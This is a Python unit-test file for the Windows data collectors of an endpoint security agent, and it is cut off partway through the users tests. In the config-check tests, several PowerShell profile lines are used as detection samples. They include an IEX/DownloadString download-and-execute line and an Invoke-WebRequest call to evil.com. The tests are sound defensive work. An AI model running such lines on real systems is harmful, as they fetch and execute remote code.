"""
agent/tests/unit/test_windows_collectors.py

Comprehensive cross-platform tests for the Windows collector layer.
All tests mock platform-specific APIs (winreg, psutil, subprocess) so they
run on macOS/Linux CI without any Windows dependencies.

Coverage
────────
1.  WatchdogCore   — sliding-window rate limiter, stop-event, agent health check
2.  ConfigsCollector._check — every suspicious-file pattern + clean paths
3.  ArpCollector   — MAC normalisation, broadcast filtering, IP validation
4.  PortsCollector — UDP/TCP/IPv6 protocol tagging
5.  BinariesCollector — _sha256_partial helper, dir-skip logic
6.  TasksCollector CSV fallback — fields with embedded commas (csv.reader fix)
7.  SysctlCollector — winreg unavailable path returns []
8.  _HKLM regression — module-level handle is not None when winreg is present
9.  SecurityCollector — registry check results plumbed through collect()
10. WinBaseCollector._run — CREATE_NO_WINDOW flag, timeout, missing binary
11. PackagesCollector — each package-manager parse path
12. StorageCollector / MountsCollector — psutil fallback logic
13. UsersCollector — PowerShell date parser, admin membership
14. Normalizer coverage for sections not yet tested (hardware, containers,
    battery, openfiles, mounts, arp, configs, binaries, sbom)
"""
from __future__ import annotations

import csv
import io
import os
import sys
import tempfile
import threading
import time
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch, call

import pytest

# Make project root importable from any working directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))
))))

# ── lazy imports so the module itself is the unit under test ──────────────────


# ═══════════════════════════════════════════════════════════════════════════════
# 1. WatchdogCore
# ═══════════════════════════════════════════════════════════════════════════════

class TestWatchdogCoreRateLimit:
    """Sliding-window restart rate limiter."""

    def _make_core(self, stop_event=None):
        from agent.os.windows.watchdog_svc import WatchdogCore
        core = WatchdogCore(stop_event=stop_event)
        return core

    def test_under_limit_allowed(self):
        core = self._make_core()
        # Inject MAX_RESTARTS - 1 timestamps well inside the window
        from agent.os.windows import watchdog_svc as ws
        now = time.time()
        for _ in range(ws.MAX_RESTARTS - 1):
            core._restarts.append(now)

        with patch.object(core, "_start_agent_service") as start_mock, \
             patch.object(core, "_event_log_error"):
            core._attempt_restart()

        start_mock.assert_called_once()

    def test_rate_limit_triggered(self):
        core = self._make_core()
        from agent.os.windows import watchdog_svc as ws
        now = time.time()
        # Fill window to the limit
        for _ in range(ws.MAX_RESTARTS):
            core._restarts.append(now)

        with patch.object(core, "_start_agent_service") as start_mock, \
             patch.object(core, "_event_log_error") as err_mock:
            core._attempt_restart()

        err_mock.assert_called_once()
        # The circuit opens without blocking the watchdog worker or making a
        # guaranteed-to-fail final request. A later poll retries after cooldown.
        start_mock.assert_not_called()
        assert core._cooldown_until > time.monotonic()

    def test_old_timestamps_evicted(self):
        """Timestamps outside RESTART_WINDOW_SEC must not count."""
        core = self._make_core()
        from agent.os.windows import watchdog_svc as ws
        old = time.time() - ws.RESTART_WINDOW_SEC - 1
        for _ in range(ws.MAX_RESTARTS):
            core._restarts.append(old)

        with patch.object(core, "_start_agent_service") as start_mock, \
             patch.object(core, "_event_log_error"):
            core._attempt_restart()

        start_mock.assert_called_once()

    def test_stop_event_prevents_loop(self):
        """WatchdogCore.run() must exit promptly when stop_event is set."""
        stop = threading.Event()
        core = self._make_core(stop_event=stop)

        with patch.object(core, "_is_agent_running", return_value=True), \
             patch.object(core, "_sleep", side_effect=lambda _: stop.set()):
            core.run()   # should return without hanging

    def test_is_agent_running_without_win32(self):
        """Without pywin32, _is_agent_running returns True (optimistic)."""
        from agent.os.windows import watchdog_svc as ws
        orig = ws._HAS_WIN32
        ws._HAS_WIN32 = False
        try:
            core = ws.WatchdogCore()
            assert core._is_agent_running() is True
        finally:
            ws._HAS_WIN32 = orig


# ═══════════════════════════════════════════════════════════════════════════════
# 2. ConfigsCollector._check — suspicious-file patterns
# ═══════════════════════════════════════════════════════════════════════════════

class TestConfigsCheck:
    """All suspicious / clean paths for every file type."""

    def _check(self, ftype, text, path="dummy"):
        from agent.os.windows.collectors.posture import ConfigsCollector
        return ConfigsCollector._check(ftype, text, path)

    # hosts
    def test_hosts_loopback_clean(self):
        text = "127.0.0.1 localhost\n::1 localhost\n"
        sus, note = self._check("hosts", text)
        assert sus is False
        assert note is None

    def test_hosts_non_loopback_suspicious(self):
        text = "127.0.0.1 localhost\n10.0.0.1 evil.corp\n"
        sus, note = self._check("hosts", text)
        assert sus is True
        assert "Non-loopback" in note

    def test_hosts_comment_skipped(self):
        text = "# 192.168.1.1 should be ignored\n127.0.0.1 localhost\n"
        sus, note = self._check("hosts", text)
        assert sus is False

    # authorized_keys
    def test_authorized_keys_empty_clean(self):
        sus, note = self._check("authorized_keys", "")
        assert sus is False

    def test_authorized_keys_with_content_suspicious(self):
        sus, note = self._check("authorized_keys", "ssh-rsa AAAA...")
        assert sus is True
        assert "authorized_keys" in note

    # shell_rc (PowerShell profile)
    @pytest.mark.parametrize("payload,expected_fragment", [
        ("IEX (New-Object Net.WebClient).DownloadString('http://x')", "IEX"),
        ("$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://x')", "DownloadString"),
        ("$wc = New-Object System.Net.WebClient", "WebClient"),
        ("[System.Convert]::FromBase64String('abc')", "Base64"),
        ("Invoke-WebRequest http://evil.com -Exec cmd", "Invoke-WebRequest"),
    ])
    def test_ps_profile_malicious_patterns(self, payload, expected_fragment):
        sus, note = self._check("shell_rc", payload)
        assert sus is True, f"Expected suspicious for: {payload}"
        assert expected_fragment.lower() in note.lower()

    def test_ps_profile_clean(self):
        text = "Set-PSReadLineOption -EditMode Vi\n$env:PATH += ';C:\\tools'\n"
        sus, note = self._check("shell_rc", text)
        assert sus is False

    # ssh_config
    def test_sshd_permitrootlogin_yes_suspicious(self):
        sus, note = self._check("ssh_config", "PermitRootLogin yes\n")
        assert sus is True
        assert "PermitRootLogin" in note

    def test_sshd_passwordauth_yes_suspicious(self):
        sus, note = self._check("ssh_config", "PasswordAuthentication yes\n")
        assert sus is True

    def test_sshd_permitrootlogin_no_clean(self):
        sus, note = self._check("ssh_config", "PermitRootLogin no\n")
        assert sus is False

    def test_unknown_ftype_clean(self):
        sus, note = self._check("unknown_type", "anything here")
        assert sus is False
        assert note is None


# ═══════════════════════════════════════════════════════════════════════════════
# 3. ArpCollector — output parsing
# ═══════════════════════════════════════════════════════════════════════════════

class TestArpCollector:
    """Test native GetIpNetTable2 row parsing without subprocesses."""

    def _make_collector(self):
        from agent.os.windows.collectors.network import ArpCollector
        return ArpCollector()

    @staticmethod
    def _row(ip: str, mac: bytes, *, state: int = 5, interface: int = 7):
        import socket
        from agent.os.windows.collectors.network import _MibIpNetRow2

        row = _MibIpNetRow2()
        row.address.family = socket.AF_INET
        for index, value in enumerate(socket.inet_pton(socket.AF_INET, ip)):
            row.address.raw[4 + index] = value
        row.interface_index = interface
        row.physical_address_length = len(mac)
        for index, value in enumerate(mac):
            row.physical_address[index] = value
        row.state = state
        return row

    def test_native_row_normalizes_mac_state_and_interface(self):
        from agent.os.windows.collectors.network import _row_to_neighbor

        row = self._row("192.168.1.1", bytes.fromhex("aabbccddeeff"))
        with patch("socket.if_indextoname", return_value="Ethernet"):
            result = _row_to_neighbor(row)
        assert result == {
            "ip": "192.168.1.1",
            "mac": "aa:bb:cc:dd:ee:ff",
            "interface": "Ethernet",
            "state": "reachable",
        }

    def test_multicast_or_broadcast_mac_is_filtered(self):
        from agent.os.windows.collectors.network import _row_to_neighbor

        row = self._row("192.168.1.255", bytes.fromhex("ffffffffffff"))
        with patch("socket.if_indextoname", return_value="Ethernet"):
            result = _row_to_neighbor(row)
        assert result is None

    def test_protocol_multicast_without_mac_is_filtered(self):
        from agent.os.windows.collectors.network import _row_to_neighbor

        row = self._row("224.0.0.251", b"")
        with patch("socket.if_indextoname", return_value="Ethernet"):
            result = _row_to_neighbor(row)
        assert result is None

    def test_collector_uses_native_api_and_never_spawns_arp(self):
        c = self._make_collector()
        expected = [{"ip": "10.0.0.1", "mac": None, "interface": "1", "state": "stale"}]
        with patch(
            "agent.os.windows.collectors.network._native_neighbors",
            return_value=expected,
        ), patch.object(c, "_run", side_effect=AssertionError("subprocess forbidden")):
            result = c.collect()
        assert result == expected


# ═══════════════════════════════════════════════════════════════════════════════
# 4. PortsCollector — protocol detection
# ═══════════════════════════════════════════════════════════════════════════════

class TestServicesCollector:
    """SCM enumeration is typed, locale-independent, and never shells out."""

    @staticmethod
    def _api():
        api = MagicMock()
        api.SC_MANAGER_ENUMERATE_SERVICE = 4
        api.SERVICE_WIN32 = 0x30
        api.SERVICE_DRIVER = 0x0B
        api.SERVICE_STATE_ALL = 3
        api.SERVICE_QUERY_CONFIG = 1
        api.SERVICE_DISABLED = 4
        api.SERVICE_DEMAND_START = 3
        api.OpenSCManager.return_value = "scm"
        api.OpenService.side_effect = lambda scm, name, access: f"handle:{name}"
        return api

    def test_native_scm_maps_state_start_type_driver_and_pid(self):
        from agent.os.windows.collectors.system import _native_services

        api = self._api()
        api.EnumServicesStatusEx.return_value = [
            {"ServiceName": "AttackLensAgent", "DisplayName": "AttackLens Agent",
             "CurrentState": 4, "ServiceType": 0x10, "ProcessId": 4321},
            ("LegacyDrv", "Legacy Driver", {
                "CurrentState": 1, "ServiceType": 0x01, "ProcessId": 0,
            }),
        ]
        api.QueryServiceConfig.side_effect = [
            (0x10, 2, 1, "agent.exe", None, 0, [], "LocalSystem", "AttackLens Agent"),
            (0x01, 4, 1, "driver.sys", None, 0, [], "System", "Legacy Driver"),
        ]

        rows = _native_services(api)
        assert rows[0] == {
            "name": "AttackLensAgent", "status": "running", "enabled": True,
            "pid": 4321, "type": "winsvc", "description": "AttackLens Agent",
        }
        assert rows[1]["status"] == "disabled"
        assert rows[1]["enabled"] is False
        assert rows[1]["pid"] is None
        assert rows[1]["type"] == "windriver"
        assert api.CloseServiceHandle.call_count == 3

    def test_collector_never_uses_sc_or_powershell(self):
        from agent.os.windows.collectors.system import ServicesCollector

        collector = ServicesCollector()
        expected = [{"name": "Svc", "status": "running"}]
        with patch(
            "agent.os.windows.collectors.system._native_services",
            return_value=expected,
        ), patch.object(
            collector, "_run", side_effect=AssertionError("subprocess forbidden")
        ), patch.object(
            collector, "_run_ps", side_effect=AssertionError("PowerShell forbidden")
        ):
            assert collector.collect() == expected


class TestPortsCollector:
    def _make_collector(self):
        from agent.os.windows.collectors.network import PortsCollector
        return PortsCollector()

    def _fake_conn(self, status, laddr_port, ctype="STREAM", family="AF_INET", pid=1):
        c = MagicMock()
        c.status = status
        c.laddr  = SimpleNamespace(ip="0.0.0.0", port=laddr_port)
        c.raddr  = None
        c.type   = MagicMock()
        c.type.__str__ = lambda _: f"SocketKind.SOCK_{ctype}"
        c.family = MagicMock()
        c.family.__str__ = lambda _: f"AddressFamily.{family}"
        c.pid    = pid
        return c

    def test_listen_tcp_captured(self):
        conn = self._fake_conn("LISTEN", 8443)
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert any(p["port"] == 8443 and p["proto"] == "tcp" for p in result)

    def test_established_skipped(self):
        conn = self._fake_conn("ESTABLISHED", 12345)
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert result == []

    def test_udp_detected(self):
        conn = self._fake_conn("", 53, ctype="DGRAM")
        conn.laddr = SimpleNamespace(ip="0.0.0.0", port=53)
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert any(p["proto"] in ("udp", "udp6") for p in result)

    def test_no_laddr_skipped(self):
        conn = self._fake_conn("LISTEN", 80)
        conn.laddr = None
        c = self._make_collector()
        with patch("psutil.net_connections", return_value=[conn]), \
             patch("psutil.process_iter", return_value=[]):
            result = c.collect()
        assert result == []


# ═══════════════════════════════════════════════════════════════════════════════
# 5. BinariesCollector — helpers
# ═══════════════════════════════════════════════════════════════════════════════

class TestBinariesCollector:
    def test_sha256_full_file_known_value(self, tmp_path):
        import hashlib
        from agent.os.windows.collectors.inventory import _sha256_file
        data = b"hello windows agent"
        fpath = tmp_path / "test.bin"
        fpath.write_bytes(data)
        expected = hashlib.sha256(data).hexdigest()
        assert _sha256_file(str(fpath)) == expected

    def test_sha256_full_file_returns_none_on_missing_file(self):
        from agent.os.windows.collectors.inventory import _sha256_file
        assert _sha256_file("/nonexistent/path/file.exe") is None

    def test_sha256_full_file_deadline_respected(self, tmp_path):
        import time
        from agent.os.windows.collectors.inventory import _sha256_file
        data = b"A" * 200
        fpath = tmp_path / "large.bin"
        fpath.write_bytes(data)
        assert _sha256_file(str(fpath), deadline=time.monotonic() - 1) is None

    def test_collect_skips_non_exe(self, tmp_path):
        from agent.os.windows.collectors.inventory import BinariesCollector
        # Create a .dll and a .exe in the scan dir
        (tmp_path / "lib.dll").write_bytes(b"DLL")
        (tmp_path / "tool.exe").write_bytes(b"EXE")

        c = BinariesCollector()
        c._SCAN_DIRS = [str(tmp_path)]
        result = c.collect()
        names = [r["name"] for r in result]
        assert "tool.exe" in names
        assert "lib.dll" not in names

    def test_collect_respects_max_files(self, tmp_path):
        from agent.os.windows.collectors.inventory import BinariesCollector
        for i in range(10):
            (tmp_path / f"prog{i}.exe").write_bytes(b"EXE")

        c = BinariesCollector()
        c._SCAN_DIRS = [str(tmp_path)]
        c._MAX_FILES = 3
        result = c.collect()
        assert len(result) == 3


# ═══════════════════════════════════════════════════════════════════════════════
# 6. TasksCollector CSV fallback — embedded commas
# ═══════════════════════════════════════════════════════════════════════════════

class TestTasksComCollector:
    """Task Scheduler COM traversal, mapping, and thread initialization."""

    @staticmethod
    def _task(path, *, enabled=True):
        from datetime import datetime, timezone

        action = SimpleNamespace(Type=0, Path="cmd.exe", Arguments='/c "echo hello, world"')
        trigger = SimpleNamespace(Type=2, StartBoundary="2026-08-11T12:00:00")
        definition = SimpleNamespace(
            Actions=[action], Triggers=[trigger],
            Principal=SimpleNamespace(UserId="SYSTEM"),
        )
        return SimpleNamespace(
            Path=path, Name=path.rsplit("\\", 1)[-1], Definition=definition,
            Enabled=enabled,
            LastRunTime=datetime(2026, 8, 11, 10, 0, tzinfo=timezone.utc),
            NextRunTime=datetime(2026, 8, 12, 10, 0, tzinfo=timezone.utc),
        )

    def test_recursive_com_collection_maps_actions_triggers_and_dates(self):
        from agent.os.windows.collectors.inventory import _native_scheduled_tasks

        child = MagicMock()
        child.Path = r"\Folder"
        child.GetFolders.return_value = []
        child.GetTasks.return_value = [self._task(r"\Folder\MyTask")]
        root = MagicMock()
        root.Path = "\\"
        root.GetFolders.return_value = [child]
        root.GetTasks.return_value = [self._task(r"\Disabled", enabled=False)]
        scheduler = MagicMock()
        scheduler.GetFolder.return_value = root
        dispatch = MagicMock(return_value=scheduler)
        runtime = MagicMock()

        rows = _native_scheduled_tasks(dispatch, runtime)
        by_name = {row["name"]: row for row in rows}
        assert by_name[r"\Folder\MyTask"]["command"] == 'cmd.exe /c "echo hello, world"'
        assert by_name[r"\Folder\MyTask"]["schedule"] == "daily:2026-08-11T12:00:00"
        assert by_name[r"\Folder\MyTask"]["user"] == "SYSTEM"
        assert by_name[r"\Folder\MyTask"]["last_run"] is not None
        assert by_name[r"\Disabled"]["enabled"] is False
        dispatch.assert_called_once_with("Schedule.Service")
        scheduler.Connect.assert_called_once_with()
        runtime.CoInitialize.assert_called_once_with()
        runtime.CoUninitialize.assert_called_once_with()

    def test_collector_never_uses_powershell_or_schtasks(self):
        from agent.os.windows.collectors.inventory import TasksCollector

        collector = TasksCollector()
        expected = [{"name": r"\Task", "type": "schtasks"}]
        with patch(
            "agent.os.windows.collectors.inventory._native_scheduled_tasks",
            return_value=expected,
        ), patch.object(
            collector, "_run", side_effect=AssertionError("subprocess forbidden")
        ), patch.object(
            collector, "_run_ps", side_effect=AssertionError("PowerShell forbidden")
        ):
            assert collector.collect() == expected


class TestAppsRegistryViews:
    def test_hklm_and_hkcu_both_wow64_views_are_enumerated_and_deduplicated(self):
        from agent.os.windows.collectors.inventory import AppsCollector

        winreg = SimpleNamespace(
            HKEY_LOCAL_MACHINE="HKLM", HKEY_CURRENT_USER="HKCU",
            KEY_WOW64_64KEY=0x100, KEY_WOW64_32KEY=0x200,
        )

        def value(_hive, _path, name, view):
            values = {
                "DisplayName": "Example App",
                "DisplayVersion": "64.0" if view == 0x100 else "32.0",
                "Publisher": "Example Corp",
                "InstallLocation": "C:\\App64" if view == 0x100 else "C:\\App32",
                "InstallDate": "20260811",
            }
            return values[name]

        collector = AppsCollector()
        with patch.dict(sys.modules, {"winreg": winreg}), patch(
            "agent.os.windows.collectors.inventory._registry_subkeys",
            return_value=["Example"],
        ) as enumerate_mock, patch(
            "agent.os.windows.collectors.inventory._rv", side_effect=value,
        ), patch.object(
            collector, "_run", side_effect=AssertionError("subprocess forbidden")
        ), patch.object(
            collector, "_run_ps", side_effect=AssertionError("PowerShell forbidden")
        ):
            rows = collector.collect()

        assert len(rows) == 2  # HKLM/HKCU duplicates collapse; x86/x64 remain.
        assert {row["version"] for row in rows} == {"32.0", "64.0"}
        assert enumerate_mock.call_args_list == [
            call("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0x100),
            call("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0x200),
            call("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0x100),
            call("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0x200),
        ]


# ═══════════════════════════════════════════════════════════════════════════════
# 7. SysctlCollector — winreg not available
# ═══════════════════════════════════════════════════════════════════════════════

class TestSysctlCollector:
    def test_returns_empty_when_winreg_missing(self):
        from agent.os.windows.collectors.posture import SysctlCollector
        c = SysctlCollector()
        with patch.dict("sys.modules", {"winreg": None}):
            result = c.collect()
        assert result == []

    def test_returns_list_of_records(self):
        from agent.os.windows.collectors.posture import SysctlCollector
        c = SysctlCollector()
        mock_winreg = MagicMock()
        mock_winreg.HKEY_LOCAL_MACHINE = 0x80000002
        mock_winreg.KEY_READ = 1
        mock_winreg.KEY_WOW64_64KEY = 0x100
        # reg_get will return {"EnableLUA": 1} for the first path
        with patch.dict("sys.modules", {"winreg": mock_winreg}), \
             patch.object(c, "reg_get", return_value={"EnableLUA": "1"}):
            result = c.collect()
        assert isinstance(result, list)
        assert all(isinstance(r, dict) for r in result)
        assert all("key" in r and "value" in r for r in result)


# ═══════════════════════════════════════════════════════════════════════════════
# 8. _HKLM regression — must not be None when winreg is present
# ═══════════════════════════════════════════════════════════════════════════════

class TestHklmRegression:
    """Regression test for the _HKLM = None bug fixed in posture.py."""

    def test_hklm_is_none_on_non_windows(self):
        """On non-Windows CI (no winreg), _HKLM must be None — reg_get handles it."""
        import importlib
        import agent.os.windows.collectors.posture as posture
        # On macOS/Linux winreg is absent → _HKLM should be None
        if sys.platform != "win32":
            assert posture._HKLM is None

    def test_hklm_is_correct_handle_when_winreg_available(self):
        """When winreg IS available, _HKLM must equal HKEY_LOCAL_MACHINE."""
        mock_winreg = MagicMock()
        mock_winreg.HKEY_LOCAL_MACHINE = 0x80000002

        with patch.dict("sys.modules", {"winreg": mock_winreg}):
            import importlib
            import agent.os.windows.collectors.posture as posture
            importlib.reload(posture)
            assert posture._HKLM == 0x80000002

    def test_uac_called_with_non_none_hive_on_windows(self):
        """SecurityCollector._uac() must pass a non-None hive to reg_get on Windows."""
        from agent.os.windows.collectors.posture import SecurityCollector
        c = SecurityCollector()
        calls: list = []

        def fake_reg_get(hive, path, name=None):
            calls.append(hive)
            return 1  # EnableLUA = 1 → "enabled"

        with patch.object(type(c), "reg_get", staticmethod(fake_reg_get)):
            import agent.os.windows.collectors.posture as posture
            orig_hklm = posture._HKLM
            posture._HKLM = 0x80000002   # simulate Windows
            try:
                result = c._uac()
            finally:
                posture._HKLM = orig_hklm

        assert calls, "reg_get was never called"
        assert calls[0] == 0x80000002, (
            f"_HKLM must be 0x80000002, got {calls[0]!r} — "
            "this is a regression of the _HKLM=None bug"
        )
        assert result == "enabled"


# ═══════════════════════════════════════════════════════════════════════════════
# 9. SecurityCollector — collect() output shape
# ═══════════════════════════════════════════════════════════════════════════════

class TestSecurityCollector:
    def _make_collector(self):
        from agent.os.windows.collectors.posture import SecurityCollector
        return SecurityCollector()

    def test_collect_returns_required_keys(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("enabled", True)), \
             patch.object(c, "_uac", return_value="enabled"), \
             patch.object(c, "_bitlocker", return_value="on"), \
             patch.object(c, "_firewall", return_value="on"), \
             patch.object(c, "_secure_boot", return_value="full"), \
             patch.object(c, "_auto_update", return_value=True), \
             patch.object(c, "_credential_guard", return_value=True), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=False), \
             patch.object(c, "_lsass_ppl", return_value=True), \
             patch.object(c, "_last_patch_age", return_value=5):
            out = c.collect()

        required = ["sip", "gatekeeper", "filevault", "xprotect",
                    "firewall", "secure_boot", "av_installed", "av_product",
                    "os_patched", "auto_update", "selinux", "apparmor",
                    "ufw", "uac", "bitlocker", "defender", "_raw"]
        for key in required:
            assert key in out, f"Missing key: {key}"

    def test_macos_linux_fields_always_none(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("unknown", False)), \
             patch.object(c, "_uac", return_value=None), \
             patch.object(c, "_bitlocker", return_value="off"), \
             patch.object(c, "_firewall", return_value="off"), \
             patch.object(c, "_secure_boot", return_value=None), \
             patch.object(c, "_auto_update", return_value=None), \
             patch.object(c, "_credential_guard", return_value=None), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=None), \
             patch.object(c, "_lsass_ppl", return_value=None), \
             patch.object(c, "_last_patch_age", return_value=None):
            out = c.collect()

        for field in ("sip", "gatekeeper", "filevault", "xprotect",
                      "selinux", "apparmor", "ufw"):
            assert out[field] is None, f"{field} must be None on Windows"

    def test_os_patched_true_when_recent_hotfix(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("enabled", True)), \
             patch.object(c, "_uac", return_value="enabled"), \
             patch.object(c, "_bitlocker", return_value="off"), \
             patch.object(c, "_firewall", return_value="on"), \
             patch.object(c, "_secure_boot", return_value="full"), \
             patch.object(c, "_auto_update", return_value=True), \
             patch.object(c, "_credential_guard", return_value=None), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=None), \
             patch.object(c, "_lsass_ppl", return_value=None), \
             patch.object(c, "_last_patch_age", return_value=10):   # 10 days ≤ 30
            out = c.collect()
        assert out["os_patched"] is True

    def test_os_patched_false_when_stale(self):
        c = self._make_collector()
        with patch.object(c, "_defender", return_value=("disabled", False)), \
             patch.object(c, "_uac", return_value=None), \
             patch.object(c, "_bitlocker", return_value="off"), \
             patch.object(c, "_firewall", return_value="off"), \
             patch.object(c, "_secure_boot", return_value=None), \
             patch.object(c, "_auto_update", return_value=None), \
             patch.object(c, "_credential_guard", return_value=None), \
             patch.object(c, "_wdac", return_value=None), \
             patch.object(c, "_smb1", return_value=None), \
             patch.object(c, "_lsass_ppl", return_value=None), \
             patch.object(c, "_last_patch_age", return_value=60):   # > 30
            out = c.collect()
        assert out["os_patched"] is False


# ═══════════════════════════════════════════════════════════════════════════════
# 10. WinBaseCollector._run — subprocess interaction
# ═══════════════════════════════════════════════════════════════════════════════

class TestWinBaseCollectorRun:
    def _make_base(self):
        from agent.os.windows.collectors.base import WinBaseCollector, CREATE_NO_WINDOW
        # Concrete subclass for testing
        class _Concrete(WinBaseCollector):
            name = "test"
            def collect(self): return {}
        return _Concrete(), CREATE_NO_WINDOW

    def test_run_returns_stdout(self):
        c, CNW = self._make_base()
        mock_result = MagicMock()
        mock_result.stdout = "hello\n"
        with patch("subprocess.run", return_value=mock_result) as run_mock:
            out = c._run(["echo", "hello"])
        assert out == "hello\n"
        run_mock.assert_called_once()
        kwargs = run_mock.call_args.kwargs
        assert kwargs["creationflags"] == CNW

    def test_run_returns_empty_on_file_not_found(self):
        c, _ = self._make_base()
        with patch("subprocess.run", side_effect=FileNotFoundError):
            out = c._run(["nosuchcmd"])
        assert out == ""

    def test_run_returns_empty_on_timeout(self):
        import subprocess
        c, _ = self._make_base()
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("cmd", 5)):
            out = c._run(["slow_cmd"])
        assert out == ""

    def test_run_ps_uses_powershell(self):
        c, CNW = self._make_base()
        with patch.object(c, "_run", return_value="ps_output") as run_mock:
            out = c._run_ps("Get-Date")
        run_mock.assert_called_once()
        cmd = run_mock.call_args.args[0]
        # Production resolves PowerShell from System32 to prevent a
        # user-writable PATH shim from being executed by LocalSystem.
        assert Path(cmd[0]).name.lower() == "powershell.exe"
        assert "-Command" in cmd
        assert "Get-Date" in cmd

    def test_run_ps_bypass_execution_policy(self):
        c, _ = self._make_base()
        with patch.object(c, "_run", return_value="") as run_mock:
            c._run_ps("anything")
        cmd = run_mock.call_args.args[0]
        assert "-ExecutionPolicy" in cmd
        assert "Bypass" in cmd

    def test_subprocess_calls_share_one_section_budget(self):
        from agent.os.windows.collectors.base import WinBaseCollector

        class _Budgeted(WinBaseCollector):
            name = "budgeted"
            timeout = 10

            def collect(self):
                return [self._run(["first"]), self._run(["second"])]

        result = MagicMock(stdout="ok")
        with patch(
            "agent.os.windows.collectors.base.time.monotonic",
            side_effect=[100.0, 101.0, 108.1],
        ), patch("subprocess.run", return_value=result) as run_mock:
            output = _Budgeted()()

        assert output == ["ok", ""]
        assert run_mock.call_count == 1
        assert run_mock.call_args.kwargs["timeout"] == pytest.approx(6.0)


# ═══════════════════════════════════════════════════════════════════════════════
# 11. PackagesCollector — per-manager parse paths
# ═══════════════════════════════════════════════════════════════════════════════

class TestPackagesCollector:
    def _make_collector(self):
        from agent.os.windows.collectors.inventory import PackagesCollector
        return PackagesCollector()

    def test_pip_parse(self):
        import json
        c = self._make_collector()
        pip_json = json.dumps([{"name": "requests", "version": "2.31.0"},
                                {"name": "psutil",   "version": "5.9.0"}])
        with patch.object(c, "_run", return_value=pip_json):
            result = c._pip()
        assert len(result) == 2
        assert result[0]["manager"] == "pip"
        assert result[0]["name"] == "requests"

    def test_pip_bad_json_returns_empty(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value="not json"):
            assert c._pip() == []

    def test_choco_parse(self):
        c = self._make_collector()
        with patch.object(c, "_run", return_value="git|2.43.0\npython|3.11.8\n"):
            result = c._choco()
        assert len(result) == 2
        assert result[0]["manager"] == "choco"
        assert result[0]["name"] == "git"
        assert result[0]["version"] == "2.43.0"

    def test_scoop_parse(self):
        c = self._make_collector()
        scoop_out = "  Name   Version  Source\n  ----   -------  ------\n  git    2.43.0   main\n"
        with patch.object(c, "_run", return_value=scoop_out):
            result = c._scoop()
        assert any(p["name"] == "git" for p in result)

    def test_winget_parse(self):
        # winget list columns: Name | Id | Version | Available | Source
        c = self._make_collector()
        winget_out = (
            "Name             Id                         Version    Available  Source\n"
            "--------------------------------------------------------------------------\n"
            "PowerShell       Microsoft.PowerShell       7.4.0                 winget\n"
            "Git              Git.Git                    2.43.0                winget\n"
        )
        with patch.object(c, "_run", return_value=winget_out):
            result = c._winget()
        assert any(p["name"] == "PowerShell" for p in result)
        # version is the 3rd column (index 2), not the Id (index 1)
        assert any(p["version"] == "2.43.0" for p in result)
        assert any(p["version"] == "7.4.0" for p in result)


# ═══════════════════════════════════════════════════════════════════════════════
# 12. StorageCollector + MountsCollector — psutil integration
# ═══════════════════════════════════════════════════════════════════════════════

class TestStorageCollector:
    def test_basic_partition(self):
        from agent.os.windows.collectors.inventory import StorageCollector
        c = StorageCollector()
        part = SimpleNamespace(device="C:\\", mountpoint="C:\\",
                               fstype="NTFS", opts="rw")
        usage = SimpleNamespace(total=250_000_000_000, used=120_000_000_000,
                                free=130_000_000_000, percent=48.0)
        with patch("psutil.disk_partitions", return_value=[part]), \
             patch("psutil.disk_usage", return_value=usage):
            result = c.collect()
        assert len(result) == 1
        assert result[0]["fstype"] == "NTFS"
        assert result[0]["pct"] == 48.0

    def test_permission_error_skipped(self):
        from agent.os.windows.collectors.inventory import StorageCollector
        c = StorageCollector()
        part = SimpleNamespace(device="D:\\", mountpoint="D:\\",
                               fstype="NTFS", opts="ro")
        with patch("psutil.disk_partitions", return_value=[part]), \
             patch("psutil.disk_usage", side_effect=PermissionError):
            result = c.collect()
        assert result == []


class TestMountsCollector:
    def test_local_volume_captured(self):
        from agent.os.windows.collectors.network import MountsCollector
        c = MountsCollector()
        part = SimpleNamespace(device="C:\\", mountpoint="C:\\",
                               fstype="NTFS", opts="rw")
        with patch("psutil.disk_partitions", return_value=[part]), \
             patch.object(c, "_run", return_value=""):
            result = c.collect()
        assert any(m["device"] == "C:\\" for m in result)

    def test_network_share_captured(self):
        from agent.os.windows.collectors.network import MountsCollector
        c = MountsCollector()
        net_use_out = (
            "New connections will be remembered.\n\n"
            "Status       Local     Remote                    Network\n"
            "-------------------------------------------------------------------------------\n"
            "OK           Z:        \\\\server\\share            Microsoft Windows Network\n"
        )
        with patch("psutil.disk_partitions", return_value=[]), \
             patch.object(c, "_run", return_value=net_use_out):
            result = c.collect()
        unc = [m for m in result if m["fstype"] == "cifs"]
        assert len(unc) == 1
        assert unc[0]["device"] == "\\\\server\\share"


# ═══════════════════════════════════════════════════════════════════════════════
# 13. UsersCollector — PowerShell date parsing & admin membership
# ═══════════════════════════════════════════════════════════════════════════════

class TestUsersCollector:
    @staticmethod
    def _apis():
        net = MagicMock()
        constants = SimpleNamespace(
            FILTER_NORMAL_ACCOUNT=2,
            UF_ACCOUNTDISABLE=0x0002,
            UF_LOCKOUT=0x0010,
        )
        security = MagicMock()
